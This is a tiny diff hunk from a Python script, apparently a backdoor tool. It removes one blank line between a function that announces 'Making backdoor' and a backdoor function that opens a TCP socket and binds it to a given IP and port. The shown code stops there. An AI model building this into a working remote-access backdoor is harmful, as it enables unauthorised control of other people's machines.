@@ -10,7 +10,6 @@ def door():
   print(f"Making backdoor with IP: {ip} and port: {port}")
   backdoor(ip, port)
 
-
 def backdoor(ip, port):
   sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   sock.bind((ip, port))
